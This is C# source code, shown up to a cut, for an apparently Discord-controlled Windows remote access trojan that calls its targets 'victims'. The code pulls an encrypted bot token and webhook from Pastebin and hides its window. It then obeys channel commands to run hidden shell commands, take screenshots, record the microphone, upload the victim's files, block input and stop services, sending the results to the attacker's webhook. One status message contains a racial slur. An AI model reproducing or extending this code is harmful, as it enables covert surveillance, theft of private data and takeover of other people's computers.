using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.ServiceProcess;
using System.Speech.Synthesis;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace Discord_New
{

    public partial class Form1 : Form
    {
        #region imports

        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true,
    ExactSpelling = true)]
        private static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uReturnLength,
    int hwndCallback);

        [DllImport("user32.dll")]
        private static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);

        [DllImport("user32.dll", EntryPoint = "BlockInput")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

        [DllImport("user32.dll")]
        private static extern void Keybd_event(byte bVk, byte bScan, uint dwFlags, uint dwExtraInfo);

        [DllImport("user32.dll")]
        private static extern byte MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetPhysicallyInstalledSystemMemory(out long TotalMemoryInKilobytes);

        [DllImport("kernel32.dll")]
        private static extern int GetLocaleInfo(uint Locale, uint LCType, [Out] StringBuilder lpLCData, int cchData);
        #endregion

        #region variables
        private const uint KEYEVENTF_EXTENDEDKEY = 0x0001;
        private const uint KEYEVENTF_KEYUP = 0x0002;
        private const byte VK_VOLUME_DOWN = 0xAE;
        private const byte VK_VOLUME_MUTE = 0xAD;
        private const byte VK_VOLUME_UP = 0xAF;
        private const uint LOCALE_SENGCOUNTRY = 0x1002;
        private const uint LOCALE_SYSTEM_DEFAULT = 0x400;
        //-----------------------------------------------//



        
        private static bool connected;

        public static bool breakout = false;
        public static bool loopread = false;
        public static bool IsElevated =>
    new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

        private static SpeechSynthesizer speaker;
        #endregion

        #region settings

        //------------------------------------------------------------------------------------------------------------------------------------------------//
        private static WebClient client = new WebClient();
        private static string reply = client.DownloadString("https://pastebin.com/raw/2A6VEQZR");



        // !!! never share the key !!!
        private static readonly string CwSLuZ = "39avUN4OdVUmXIxgP9DJuag4iNXAjWhm"; // dont change it its a new key
        // !!! never share the key !!!

        //value string is discord account token, cID is channel ID, webHook is webhook and RatVersion is RatVersion xD
        private static readonly string value = Aes256CbcEncrypter.Decrypt(Between(reply, "#", "##"), CwSLuZ); // between means that it gets the string from the downloaded google drive .txt like, it gets the string between #STRING##
        private static readonly string cID = Aes256CbcEncrypter.Decrypt(Between(reply, "*", "**"), CwSLuZ); // gets string between *ENCRYPTEDSTRING**
        private static readonly string webHook = Aes256CbcEncrypter.Decrypt(Between(reply, "+", "++"), CwSLuZ); // gets string between +ENCRYPTEDSTRING++
        private static readonly string RatVersion = Aes256CbcEncrypter.Decrypt(Between(reply, "-", "--"), CwSLuZ); // gets string between +ENCRYPTEDSTRING++
        //------------------------------------------------------------------------------------------------------------------------------------------------//


        public static string name = Environment.UserName;
        public static string data = "";
        public static string dataxd = "";
        public static string MicFile = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\" + DateTime.Today.ToString("dd-MM-yyyy") + "_" + get_unique_string(25) + ".mp3";
        #endregion


        #region detections
        public void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            switch (e.Reason)
            {
                case SessionEndReasons.Logoff:
                    embedGenerate("Disconnected", "https://tchol.org/images/bloody-png-12.png", "https://tchol.org/images/bloody-png-12.png", "Name", Environment.UserName, "Status", "Logoff");
                    break;

                case SessionEndReasons.SystemShutdown:
                    embedGenerate("Disconnected", "https://tchol.org/images/bloody-png-12.png", "https://tchol.org/images/bloody-png-12.png", "Name", Environment.UserName, "Status", "Shutdown");
                    break;
            }
        }
        private void AvailabilityChanged(object sender, NetworkAvailabilityEventArgs e)
        {
            embedGenerate("Internet Plugged in", "https://tchol.org/images/bloody-png-12.png", "https://tchol.org/images/bloody-png-12.png", "Name", Environment.UserName, "Status", "Connected", "Info", $"``Use '!connect {Environment.UserName}' to control the target - You can control several targets at the same time!``", "Info_2", "Victim plugged his internet in!");
        }
        #endregion



        public static string embedGenerate(string title_text, string footer_icon, string thumbnail_url, string valuename1 = "", string value1 = "", string valuename2 = "", string value2 = "", string valuename3 = "", string value3 = "", string valuename4 = "", string value4 = "", string valuename5 = "", string value5 = "", string valuename6 = "", string value6 = "", string valuename7 = "", string value7 = "", string valuename8 = "", string value8 = "", string valuename9 = "", string value9 = "", string valuename0 = "", string value0 = "")
        {
            string optionalField1 = "";
            string optionalField2 = "";
            string optionalField3 = "";
            string optionalField4 = "";
            string optionalField5 = "";
            string optionalField6 = "";
            string optionalField7 = "";
            string optionalField8 = "";
            string optionalField9 = "";
            string optionalField0 = "";

            if (value1 != "")
            {
                optionalField1 = @"
        {
          ""name"": """ + valuename1 + @""",
          ""value"": """ + value1 + @"""
        }";
            }

            if (value2 != "")
            {
                optionalField2 = @",
        {
          ""name"": """ + valuename2 + @""",
          ""value"": """ + value2 + @"""
        }";
            }

            if (value3 != "")
            {
                optionalField3 = @",
        {
          ""name"": """ + valuename3 + @""",
          ""value"": """ + value3 + @"""
        }";
            }

            if (value4 != "")
            {
                optionalField4 = @",
        {
          ""name"": """ + valuename4 + @""",
          ""value"": """ + value4 + @"""
        }";
            }

            if (value5 != "")
            {
                optionalField5 = @",
        {
          ""name"": """ + valuename5 + @""",
          ""value"": """ + value5 + @"""
        }";
            }

            if (value6 != "")
            {
                optionalField6 = @",
        {
          ""name"": """ + valuename6 + @""",
          ""value"": """ + value6 + @"""
        }";
            }

            if (value7 != "")
            {
                optionalField7 = @",
        {
          ""name"": """ + valuename7 + @""",
          ""value"": """ + value7 + @"""
        }";
            }

            if (value8 != "")
            {
                optionalField8 = @",
        {
          ""name"": """ + valuename8 + @""",
          ""value"": """ + value8 + @"""
        }";
            }

            if (value9 != "")
            {
                optionalField9 = @",
        {
          ""name"": """ + valuename9 + @""",
          ""value"": """ + value9 + @"""
        }";
            }

            if (value0 != "")
            {
                optionalField0 = @",
        {
          ""name"": """ + valuename0 + @""",
          ""value"": """ + value0 + @"""
        }";
            }

            string FinalString = "";
            WebClient w = new WebClient();
            w.Headers["Content-Type"] = "application/json";
            byte[] data1 = Encoding.ASCII.GetBytes(@"{
  ""embeds"": [
    {
                    ""title"": """ + title_text + @""",
      ""color"": 16711680,
      ""footer"": {
                        ""icon_url"": """ + footer_icon + @""",
        ""text"": """ + RatVersion + @"""
      },
      ""thumbnail"": {
                        ""url"": """ + thumbnail_url + @"""
      },
      ""fields"": [
        " + optionalField1 + @"
        " + optionalField2 + @"
        " + optionalField3 + @"
        " + optionalField4 + @"
        " + optionalField5 + @"
        " + optionalField6 + @"
        " + optionalField7 + @"
        " + optionalField8 + @"
        " + optionalField9 + @"
        " + optionalField0 + @"
      ]
    }
  ]
}");
            w.UploadData(webHook, data1);
            return FinalString;
        }



        public Form1()
        {
            InitializeComponent();
        }



        private void Form1_Load(object sender, EventArgs e)
        {
            Class1.gay();

            embedGenerate("Connected",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Name", Environment.UserName,
    "Status",
    "Connected",
    "UAC Bypassed",
    IsElevated.ToString(),
    "Info", $"``Use '!connect {Environment.UserName}' to control the target - You can control several targets at the same time!``");


            this.ShowInTaskbar = false;
            this.FormBorderStyle = FormBorderStyle.FixedToolWindow;

            SystemEvents.SessionEnding += SystemEvents_SessionEnding;
            var myHandler = new NetworkAvailabilityChangedEventHandler(AvailabilityChanged);
            NetworkChange.NetworkAvailabilityChanged += myHandler;

            Readmsg(true);
        }


        //reading the commands
    public async static void Readmsg(object state)
        {
            loopread = !loopread;
            loopread = true;
            try
            {
                while (loopread)
                {
                    await Task.Delay(500);
                    WebClient webby = new WebClient();
                    webby.Proxy = null;
                    webby.Headers["Authorization"] = value;
                    data = webby.DownloadString($"https://discordapp.com/api/v6/channels/{cID}/messages?limit=1"); //Gets the last message sent in a Specific Channel
                    data = data.Replace("\"", "");
                    string accountname = Between(data, "username: ", ", discriminat");
                    data = Between(data, "content: ", ", channel_id");

                    if (accountname != "Discord")
                    {
                        if (data.Contains("!"))
                        {
                            CommandHandler(data);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
            }

            if (!breakout)
            {
                ThreadPool.QueueUserWorkItem(Readmsg);
            }
        }


        public static void CommandHandler(string command)
        {
            if (command.Contains("!online"))
            {
                try
                {
                    embedGenerate("Online",
                    "https://tchol.org/images/bloody-png-12.png",
                    "https://tchol.org/images/bloody-png-12.png",
                    "Name", $"{Environment.UserName}",
                    "Status", "Connected",
                    "Ping", new Ping().Send("www.google.com").RoundtripTime.ToString() + "ms",
                    "UAC Bypassed", IsElevated.ToString());
                }
                catch (Exception ex)
                {
                    embedGenerate("Exception",
"https://tchol.org/images/bloody-png-12.png",
"https://tchol.org/images/bloody-png-12.png",
"Message", ex.Message);
                }
            }

            #region connect & disconnect
            if (connected == true)
            {
                try
                {
                    if (command.Contains("!connect"))
                {
                    embedGenerate("Already Connected", "https://tchol.org/images/bloody-png-12.png", "https://tchol.org/images/bloody-png-12.png", "Error", $"``You are already connected to {Environment.UserName}``");
                }
                }
                catch (Exception ex)
                {
                    embedGenerate("Exception",
"https://tchol.org/images/bloody-png-12.png",
"https://tchol.org/images/bloody-png-12.png",
"Message", ex.Message);
                }
            }
            else
            {
                try
                {
                    if (command.Contains("!connect " + Environment.UserName))
                {
                    connected = true;
                    embedGenerate("Connected", "https://tchol.org/images/bloody-png-12.png", "https://tchol.org/images/bloody-png-12.png", "Info", $"You are now connected to {Environment.UserName}", "Info_2", $"``Use '!disconnect {Environment.UserName}' to not control the victim anymore!``");
                }
                }
                catch (Exception ex)
                {
                    embedGenerate("Exception",
"https://tchol.org/images/bloody-png-12.png",
"https://tchol.org/images/bloody-png-12.png",
"Message", ex.Message);
                }
            }
            if (connected == false)
            {
                try
                {
                    if (command.Contains("!disconnect"))
                {
                    embedGenerate("You can't disconnect", "https://tchol.org/images/bloody-png-12.png", "https://tchol.org/images/bloody-png-12.png", "Error", $"You can't disconnect because you aren't connected to anyone!");
                }
                }
                catch (Exception ex)
                {
                    embedGenerate("Exception",
"https://tchol.org/images/bloody-png-12.png",
"https://tchol.org/images/bloody-png-12.png",
"Message", ex.Message);
                }
            }
            else
            {
                try
                {
                    if (command.Contains("!disconnect " + Environment.UserName))
                {
                    connected = false;
                    embedGenerate("Disconnected", "https://tchol.org/images/bloody-png-12.png", "https://tchol.org/images/bloody-png-12.png", "Info", $"You are now disconnected from {Environment.UserName}", "Info_2", $"``Use '!connect {Environment.UserName}' to control the victim again!``");
                }
                }
                catch (Exception ex)
                {
                    embedGenerate("Exception",
"https://tchol.org/images/bloody-png-12.png",
"https://tchol.org/images/bloody-png-12.png",
"Message", ex.Message);
                }
            }
            #endregion

            if (connected)
            {
                if (command.Contains("!victims"))
                {
                    try
                    {
                        embedGenerate("Victim",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", $"{Environment.UserName}",
                        "Status", "Connected",
                        "Ping", new Ping().Send("www.google.com").RoundtripTime.ToString() + "ms",
                        "UAC Bypassed", IsElevated.ToString());
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!version"))
                {
                    try
                    {
                        embedGenerate("Version",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Runtime", $"{RuntimeInformation.FrameworkDescription} {RuntimeInformation.OSArchitecture}",
                        "Uptime", $"{GetUptime()}",
                        "Heap Size", $"{GetHeapSize()} MB");
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!screen"))
                {
                    try
                    {
                        embedGenerate("Screenshot",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Took Screenshot");

                //Create a new bitmap.
                var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                        Screen.PrimaryScreen.Bounds.Height,
                        PixelFormat.Format32bppArgb);

                    // Create a graphics object from the bitmap.
                    var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

                    // Take the screenshot from the upper left corner to the right bottom corner.
                    gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                        Screen.PrimaryScreen.Bounds.Y,
                        0,
                        0,
                        Screen.PrimaryScreen.Bounds.Size,
                        CopyPixelOperation.SourceCopy);


                    // Save the screenshot to the specified path that the user has chosen.

                    var f = new Font("Arial", 20);
                    // Create a brush
                    var b = new SolidBrush(Color.Red);
                    // Draw some text
                    gfxScreenshot.DrawString("Screenshot from: " + Environment.UserName, f, b, 1100, 1050);


                    bmpScreenshot.Save(
                        "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\scr.png",
                        ImageFormat.Png);

                    WebClient w = new WebClient();
                    w.UploadFile(webHook, "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\scr.png");
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!open"))
                {
                    try
                    {
                        var messageToSend = command.Replace("!open", "").Replace(" ", "");
                    Process.Start(messageToSend);

                    embedGenerate("Opened",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Opened Program/Website",
                        "Value", messageToSend);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!messagebox"))
                {
                    try
                    {
                    var messageToSend = command.Replace("!messagebox", "");

                    embedGenerate("Messagebox",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Opened Messagebox",
                        "Message", messageToSend);

                    MessageBox.Show(messageToSend, messageToSend, MessageBoxButtons.OK);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!messagevoice"))
                {
                    try
                    {
                        var messageToSend = command.Replace("!messagevoice", "");
                    speaker = new SpeechSynthesizer();
                    speaker.SpeakAsync(messageToSend);

                    embedGenerate("Text2Speech",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Sent Text2Speech message",
                        "Message", messageToSend);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!wallpaper upload"))
                {
                    try
                    {
                    var messageToSend = command.Replace("!wallpaper upload", "");

                    var uriPath = new List<string>();
                    uriPath.Add(messageToSend);
                    var background = new WindowsBackground(uriPath, 200);
                    background.startChangeWallpaper();

                    embedGenerate("Wallpaper",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Changed",
                        "Wallpaper", messageToSend);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!wallpaper get"))
                {
                    try
                    {
                        var wallpaper = Registry.GetValue(@"HKEY_CURRENT_USER\Control Panel\Desktop", "WallPaper", 0)
                        .ToString();

                    embedGenerate("Wallpaper",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Fuck you Nigga");

                    WebClient w = new WebClient();
                    w.UploadFile(webHook, wallpaper);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!kill"))
                {
                    try
                    {
                        var messageToSend = command.Replace("!kill", "").Replace(" ", "");

                    foreach (var proc in Process.GetProcessesByName(messageToSend)) proc.Kill();

                    embedGenerate("Kill Process",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Killed",
                        "Process", messageToSend);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!cmd"))
                {
                    try
                    {
                    var messageToSend = command.Replace("!cmd", "");

                    var cmd1 = new Process();
                    cmd1.StartInfo.FileName = "cmd.exe";
                    cmd1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    cmd1.StartInfo.Arguments = "/c " + messageToSend + "> C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\output.txt";
                    cmd1.Start();
                    cmd1.WaitForExit();

                        var output = File.ReadAllText("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\output.txt", Encoding.UTF8);
                        string output1 = output.Replace("\r", "").Replace("\n", "\\n");

                        embedGenerate("CMD",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Executed",
                        "Command", messageToSend,
                        "Output", "``" + output1 + "``");

                    File.Delete("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\output.txt");
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!record high"))
                {
                    try
                    {
                        var messageToSend = command.Replace("!record high", "");
                    var seconds = int.Parse(messageToSend);

                    embedGenerate("Record Microphone",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Recording",
                        "Quality", "High",
                        "Duration", messageToSend);

                    mciSendString("open new Type waveaudio Alias recsound", "", 0, 0);
                    mciSendString(
                        "set recsound time format ms bitspersample 16 channels 2 samplespersec 48000 bytespersec 192000 alignment 4",
                        "", 0, 0);
                    mciSendString("record recsound", "", 0, 0);
                    var tthen = DateTime.Now;
                    do
                    {
                        Application.DoEvents();
                    } while (tthen.AddSeconds(seconds + 1) > DateTime.Now);

                    mciSendString("save recsound " + MicFile, "", 0, 0);
                    mciSendString("close recsound ", "", 0, 0);

                    embedGenerate("Recorded Microphone",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Recorded",
                        "Quality", "High",
                        "Duration", messageToSend);

                    WebClient w = new WebClient();
                    w.UploadFile(webHook, MicFile);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!record low"))
                {
                    try
                    {
                    var messageToSend = command.Replace("!record low", "");
                    var seconds = int.Parse(messageToSend);

                    embedGenerate("Record Microphone",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Recording",
                        "Quality", "Low",
                        "Duration", messageToSend);

                    mciSendString("open new Type waveaudio Alias recsound", "", 0, 0);
                    mciSendString("record recsound", "", 0, 0);
                    var tthen = DateTime.Now;
                    do
                    {
                        Application.DoEvents();
                    } while (tthen.AddSeconds(seconds + 1) > DateTime.Now);

                    mciSendString("save recsound " + MicFile, "", 0, 0);
                    mciSendString("close recsound ", "", 0, 0);

                    embedGenerate("Recorded Microphone",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Recorded",
                        "Quality", "Low",
                        "Duration", messageToSend);

                    WebClient w = new WebClient();
                    w.UploadFile(webHook, MicFile);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }


                if (command.Contains("!files get"))
                {
                    try
                    {
                    var messageToSend = command.Replace("!files get", "").Replace(" ", "").Replace(@"\\", @"\");

                    DirectoryInfo d = new DirectoryInfo(messageToSend);//Assuming Test is your Folder
                    FileInfo[] Files = d.GetFiles("*.*"); //Getting Text files
                    string str = "";
                    foreach (FileInfo file in Files)
                    {
                        str = str + file.Name + "\\n";
                    }

                    embedGenerate("Get Files",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Collected",
                        "Files", "```" + str + "```");
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!files download"))
                {
                    try
                    {
                    var messageToSend =  command.Replace("!files download", "").Replace(" ", "").Replace(@"\\", @"\");
                    var allfiles = Directory.GetFiles(messageToSend, "*.*", SearchOption.TopDirectoryOnly);

                    embedGenerate("Get Files",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Downloading");

                    WebClient w = new WebClient();
                    foreach (var file in allfiles) w.UploadFile(webHook, file);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!monitor off"))
                {
                    try
                    {
                        SetMonitorInState(MonitorState.MonitorStateOff);

                    embedGenerate("Monitor",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Off");
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }
                if (command.Contains("!monitor on"))
                {
                    try
                    {
                        SetMonitorInState(MonitorState.MonitorStateOn);

                    embedGenerate("Monitor",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Off");
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!block true"))
                {
                    try
                    {
                        BlockInput(true);

                    embedGenerate("Monitor",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Off");
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }
                if (command.Contains("!block false"))
                {
                    try
                    {
                        BlockInput(false);

                    embedGenerate("Monitor",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Off");
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!service stop"))
                {
                    try
                    {
                    var messageToSend = command.Replace("!service stop", "");
                    var sc = new ServiceController(messageToSend);
                    sc.Stop();

                    embedGenerate("Service",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Stopped",
                        "Service", messageToSend);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }
                if (command.Contains("!service start"))
                {
                    try
                    {
                    var messageToSend = command.Replace("!service start", "");
                    var sc = new ServiceController(messageToSend);
                    sc.Start();

                    embedGenerate("Service",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Stopped",
                        "Service", messageToSend);
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }
                if (command.Contains("!service get"))
                {
                    try
                    {
                        var fs1 = new FileStream(
        "C:\\Users\\" + Environment.UserName +
        "\\AppData\\Roaming\\Microsoft\\Windows\\svchost1.txt", FileMode.OpenOrCreate,
        FileAccess.Write);
                        var writer = new StreamWriter(fs1);

                        foreach (var service in ServiceController.GetServices())
                        {
                            var serviceName = service.ServiceName;
                            var serviceDisplayName = service.DisplayName;
                            var serviceType = service.ServiceType.ToString();
                            var status = service.Status.ToString();
                            writer.Write(serviceName + "  " + serviceDisplayName + serviceType + " " + status + "\n");
                        }

                        writer.Close();

                        embedGenerate("Service",
                            "https://tchol.org/images/bloody-png-12.png",
                            "https://tchol.org/images/bloody-png-12.png",
                            "Name", Environment.UserName,
                            "Status", "Stopped",
                            "Services", "Below");

                        WebClient w = new WebClient();
                        w.UploadFile(webHook, "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\svchost1.txt");
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!note set"))
                {
                    try
                    {
                    var messageToSend = command.Replace("!note set", "");

                    var fs1 = new FileStream("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\note.txt", FileMode.OpenOrCreate, FileAccess.Write);
                    var writer = new StreamWriter(fs1);
                    writer.Write(messageToSend);
                    writer.Close();

                    embedGenerate("Note",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Setted",
                        "Note", "`" + messageToSend + "`");
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }
                if (command.Contains("!note get"))
                {
                    try
                    {
                    string note = File.ReadAllText("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\note.txt", Encoding.UTF8);

                    embedGenerate("Note",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Get",
                        "Note", "`" + note + "`");
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }
                if (command.Contains("!note remove"))
                {
                    try
                    {
                    string note = File.ReadAllText("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\note.txt", Encoding.UTF8);
                    string path = "C:\\\\Users\\\\" + Environment.UserName + "\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\note.txt";

                    embedGenerate("Note",
                        "https://tchol.org/images/bloody-png-12.png",
                        "https://tchol.org/images/bloody-png-12.png",
                        "Name", Environment.UserName,
                        "Status", "Removed",
                        "Note", note,
                        "Path", path);

                    File.Delete("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\note.txt");
                    }
                    catch (Exception ex)
                    {
                        embedGenerate("Exception",
    "https://tchol.org/images/bloody-png-12.png",
    "https://tchol.org/images/bloody-png-12.png",
    "Message", ex.Message);
                    }
                }

                if (command.Contains("!volume up"))
                {
                    try
                    {
                    string messageToSend = command.Replace("!volume up", "");
                    var x = int.Parse(messageToSend);
                    var b = x.ToString();

                    for (var i = 0; i < x; i++)
                    {
                        Keybd_event(VK_VOLUME_UP, MapVirtualKey(VK_VOLUME_UP, 0), KEYEVENTF_EXTENDEDKEY, 0);
